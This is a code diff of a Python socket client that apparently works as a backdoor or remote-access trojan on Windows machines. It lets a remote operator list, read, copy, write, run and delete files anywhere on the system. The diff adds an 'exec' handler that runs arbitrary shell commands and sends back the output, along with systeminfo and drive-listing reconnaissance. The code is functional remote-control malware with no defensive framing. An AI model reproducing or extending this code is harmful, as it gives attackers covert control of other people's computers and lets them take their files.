@@ -1,12 +1,13 @@
 import socket
 import os
 from uuid import uuid4
+import subprocess
+import platform
 
-ADDR = # YOUR PUBLIC IP ADDRESS SO YOUR CLIENT CAN CONNECT TO YOU
-PORT = # PORT YOU WILL USE TO CONNECT TO THE CLIENT
+ADDR = socket.gethostbyname(socket.gethostname())
+PORT = 80
 
-CURRENT_DIRECTORY = os.getenv('USERPROFILE')
-OS_DIR = os.getenv('USERPROFILE')
+os.chdir(os.getenv('USERPROFILE'))
 
 def recvall(connection):
 
@@ -56,41 +57,36 @@ while True:
                     s.sendall(getMsgWithDataSplit('online'))
 
                 elif command == 'EstablishConnection':
-                    s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
+                    s.sendall(getMsgWithDataSplit(os.getcwd()))
                 
                 elif command == 'ls':
                     try:
-                        listedFiles = os.listdir(OS_DIR)
+                        listedFiles = os.listdir()
                     except:
                         listedFiles = 'ERROR'
                     s.sendall(getMsgWithDataSplit(str(listedFiles)))
                 
                 elif command == 'cd':
                     changedDirectory = recvall(s)
-                    if changedDirectory == '..' and os.path.isdir(os.path.abspath(os.path.join(OS_DIR + '\\..'))):
-                        OS_DIR += '\\..'
-                        CURRENT_DIRECTORY = os.path.abspath(OS_DIR)
-                        s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
-                    elif os.path.exists(os.path.join(CURRENT_DIRECTORY, changedDirectory)) and os.path.isdir(os.path.abspath(os.path.join(OS_DIR, changedDirectory))):
-                        OS_DIR += f'\\{changedDirectory}'
-                        CURRENT_DIRECTORY = os.path.abspath(OS_DIR)
-                        s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
+                    if os.path.exists(changedDirectory) and os.path.isdir(changedDirectory):
+                        os.chdir(changedDirectory)
+                        s.sendall(getMsgWithDataSplit(os.getcwd()))
                     else:
                         s.sendall(getMsgWithDataSplit('ERROR'))
                 
                 elif command == 'goto':
-                    gotoDirectory = recvall(s) + '\\'
-                    if os.path.exists(os.path.abspath(gotoDirectory)) and os.path.isdir(os.path.abspath(gotoDirectory)):
-                        OS_DIR = os.path.abspath(gotoDirectory)
-                        CURRENT_DIRECTORY = OS_DIR
-                        s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
+                    gotoDirectory = recvall(s)
+
+                    if os.path.exists(gotoDirectory) and os.path.isdir(gotoDirectory):
+                        os.chdir(gotoDirectory)
+                        s.sendall(getMsgWithDataSplit(os.getcwd()))
                     else:
                         s.sendall(getMsgWithDataSplit('ERROR'))
                 
                 elif command == 'size':
                     fileName = recvall(s)
                     try:
-                        fileSize = os.stat(os.path.join(OS_DIR, fileName)).st_size
+                        fileSize = os.stat(fileName).st_size
                     except:
                         fileSize = False
                     if fileSize:
@@ -101,15 +97,14 @@ while True:
                 elif command == 'read':
                     fileName = recvall(s)
                     try:
-                        with open(os.path.join(OS_DIR, fileName), 'r') as f:
+                        with open(fileName, 'r') as f:
                             s.sendall(getMsgWithDataSplit(f.read()))
                     except:
                         try:
-                            with open(os.path.join(OS_DIR, fileName), 'rb') as f:
+                            with open(fileName, 'rb') as f:
                                 s.sendall(getMsgWithDataSplit(str(f.read())[2:-1]))
                         except:
                             s.sendall(getMsgWithDataSplit('ERROR'))
-
                 
                 elif command == 'write':
                     fileName = recvall(s)
@@ -119,19 +114,20 @@ while True:
                     else:
                         try:
                             if type(eval(fileData)) == bytes:
-                                with open(os.path.join(OS_DIR, fileName), 'wb') as f:
+                                with open(fileName, 'wb') as f:
                                     f.write(eval(fileData))
                             else:
-                                with open(os.path.join(OS_DIR, fileName), 'w') as f:
+                                with open(fileName, 'w') as f:
                                     f.write(fileData)
 
-                            s.sendall(getMsgWithDataSplit(os.path.join(OS_DIR, fileName)))
-                        except Exception as e:
+                            s.sendall(getMsgWithDataSplit(os.path.join(os.getcwd(), fileName)))
+
+                        except:
                             try:
-                                with open(os.path.join(OS_DIR, fileName), 'w') as f:
+                                with open(fileName, 'w') as f:
                                     f.write(fileData)
                                 
-                                s.sendall(getMsgWithDataSplit(os.path.join(OS_DIR, fileName)))
+                                s.sendall(getMsgWithDataSplit(os.path.join(os.getcwd(), fileName)))
                             except:
                             
                                 s.sendall(getMsgWithDataSplit('ERROR'))
@@ -139,15 +135,15 @@ while True:
                 elif command == 'copy':
                     fileName = recvall(s)
 
-                    if os.path.exists(os.path.join(OS_DIR, fileName)):
+                    if os.path.exists(fileName):
                         try:
-                            with open(os.path.join(OS_DIR, fileName), 'r') as f:
+                            with open(fileName, 'r') as f:
                                 fileData = f.read()
 
                             s.sendall(getMsgWithDataSplit(fileData))
                         except:
                             try:
-                                with open(os.path.join(OS_DIR, fileName), 'rb') as f:
+                                with open(fileName, 'rb') as f:
                                     fileData = f.read()
                                 
                                 s.sendall(getMsgWithDataSplit(str(fileData)))
@@ -159,7 +155,7 @@ while True:
                 elif command == 'run':
                     fileName = recvall(s)
                     try:
-                        os.startfile(os.path.join(OS_DIR, fileName))
+                        os.startfile(fileName)
                         s.sendall(getMsgWithDataSplit('Sucess'))
                     except:
                         s.sendall(getMsgWithDataSplit('ERROR'))
@@ -167,7 +163,7 @@ while True:
                 elif command == 'rm':
                     fileName = recvall(s)
                     try:
-                        os.remove(os.path.join(OS_DIR, fileName))
+                        os.remove(fileName)
                         s.sendall(getMsgWithDataSplit('Success'))
                     except:
                         s.sendall(getMsgWithDataSplit('ERROR'))
@@ -175,7 +171,7 @@ while True:
                 elif command == 'mkdir':
                     folderName = recvall(s)
                     try:
-                        os.mkdir(os.path.join(OS_DIR, folderName))
+                        os.mkdir(folderName)
                         s.sendall(getMsgWithDataSplit('Success'))
                     except:
                         s.sendall(getMsgWithDataSplit('ERROR'))
@@ -184,20 +180,46 @@ while True:
                 elif command == 'rmdir':
                     folderName = recvall(s)
                     try:
-                        os.rmdir(os.path.join(OS_DIR, folderName))
+                        os.rmdir(folderName)
                         s.sendall(getMsgWithDataSplit('Success'))
+                    except:
+                        s.sendall(getMsgWithDataSplit('ERROR'))
+
+                elif command == 'exec':
+                    executeCommand = recvall(s)
+                    try:
+                        commandResult = subprocess.check_output(executeCommand, shell = True)
+                        s.sendall(getMsgWithDataSplit(commandResult.decode()))
+                    except:
+                        s.sendall(getMsgWithDataSplit('ERROR'))
+
+                elif command == 'sysinfo':
+                    try:
+                        sysInfo = subprocess.check_output('systeminfo', shell = True)
+                        s.sendall(getMsgWithDataSplit(sysInfo.decode()))
+                    except:
+                        s.sendall(getMsgWithDataSplit('ERROR'))
+                
+                elif command == 'drives':
+                    try:
+                        sysInfo = subprocess.check_output('fsutil fsinfo drives', shell = True)
+                        s.sendall(getMsgWithDataSplit(sysInfo.decode()))
+                    except:
+                        s.sendall(getMsgWithDataSplit('ERROR'))
+
+                elif command == 'system':
+                    try:
+                        system = platform.system()
+                        s.sendall(getMsgWithDataSplit(system))
                     except:
                         s.sendall(getMsgWithDataSplit('ERROR'))
                 
                 elif command == 'CloseConnection':
-                    OS_DIR = os.getenv('USERPROFILE')
-                    CURRENT_DIRECTORY = os.path.abspath(OS_DIR).strip('\\')
+                    os.chdir(os.getenv('USERPROFILE'))
 
                 else:
-                    OS_DIR = os.getenv('USERPROFILE')
-                    CURRENT_DIRECTORY = os.path.abspath(OS_DIR).strip('\\')
+                    os.chdir(os.getenv('USERPROFILE'))
                     break
 
     except:
-        CURRENT_DIRECTORY = os.getenv('USERPROFILE')
-        OS_DIR = os.getenv('USERPROFILE')
+        os.chdir(os.getenv('USERPROFILE'))
